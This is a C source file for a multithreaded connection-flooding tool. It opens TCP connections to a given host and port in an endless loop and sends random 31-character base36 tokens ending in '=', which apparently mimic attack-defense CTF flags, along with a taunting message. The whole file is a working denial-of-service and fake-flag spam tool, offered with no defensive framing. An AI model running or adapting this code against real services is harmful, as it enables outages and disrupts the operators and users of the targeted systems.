#include <stdlib.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/socket.h>

// #define DEBUG

const int CONNECTIONS = 1;
const int ARGS_COUNT = 5;
const char *MESSAGE = "her vam a ne sploity\n";

void *attack(void *args);
void broke(int s);

char *host, *port;
int delay, threads_cnt;
int random_fd;

int main(int argc, char *argv[]) {
  if (argc != ARGS_COUNT) {
    fputs("Expected 4 arguments.", stderr);
    return 1;
  }
  
  signal(SIGPIPE, &broke);

  host = argv[1];
  port = argv[2];
  delay  = atoi(argv[3]);
  threads_cnt = atoi(argv[4]);
  random_fd = open("/dev/urandom", O_RDONLY);

  pthread_t threads[threads_cnt];
#ifdef DEBUG
  void *thread_args[threads_cnt];
#endif
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  

  while (true) {

    for (int i = 0; i < threads_cnt; ++i) {
#ifdef DEBUG
      thread_args[i] = malloc(sizeof(i));
      *(int*)thread_args[i] = i;
      pthread_create(&threads[i], &attr, attack, thread_args[i]);
#else
      pthread_create(&threads[i], &attr, attack, NULL);
#endif
    }

    for (int i = 0; i < threads_cnt; ++i) {
      pthread_join(threads[i], NULL);
#ifdef DEBUG
      free((int*)thread_args[i]);
#endif
    }

  }

  return 0;
}

char *create_base36();
int init_connection(char *host, char *port);

void *attack(void *args) {
#ifdef DEBUG
  int id = *(int*) args;
#endif
  while (true) {

    for (int i = 0; i < CONNECTIONS; ++i) {
      int socket = init_connection(host, port);
      if (socket == -1) continue;
      char *msg = create_base36();
      write(socket, msg, strlen(msg));
      free(msg);
      close(socket);

      socket = init_connection(host, port);
      if (socket == -1) continue;
      write(socket, MESSAGE, strlen(MESSAGE));
      close(socket);

#ifdef DEBUG
      fprintf(stdout, "[%d: Voly Sent]\n", id);
#endif
    }

    usleep(delay * 1000);
  }
}

int init_connection(char *host, char *port) {
  struct addrinfo hints, *servinfo, *iter;
  int sock, result;

#ifdef DEBUG
  fprintf(stdout, "[Connecting -> %s:%s]\n", host, port);
#endif

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  if ((result = getaddrinfo(host, port, &hints, &servinfo)) != 0) {

    if (servinfo) freeaddrinfo(servinfo);
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(result));
    return -1;

  }

  for (iter = servinfo; iter != NULL; iter = iter->ai_next) {
    sock = socket(iter->ai_family,
                  iter->ai_socktype,
                  iter->ai_protocol);
    if (sock == -1) continue;

    int connection = connect(sock, iter->ai_addr, iter->ai_addrlen);
    if (connection != -1) break;

    close(sock);
  }
  
  if (servinfo) freeaddrinfo(servinfo);

  if (iter == NULL) {
    fprintf(stderr, "No connection could be made.\n");
    return -1;
  }
  
#ifdef DEBUG
  fprintf(stdout, "[Connected -> %s:%s]\n", host, port);
#endif

  return sock;
}


char *create_base36() {
  const char *BASE36_ARGS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const int length = strlen(BASE36_ARGS);

  char *result = (char *) calloc(34, sizeof(char));
  uint64_t data = 0;

  for (int i = 0; i < 31; ++i) {
    read(random_fd, &data, sizeof(data));
    result[i] = BASE36_ARGS[data % length];
  }
  result[31] = '=';
  result[32] = '\n';

  return result;
}

void broke(int s) {
  // do nothing
}
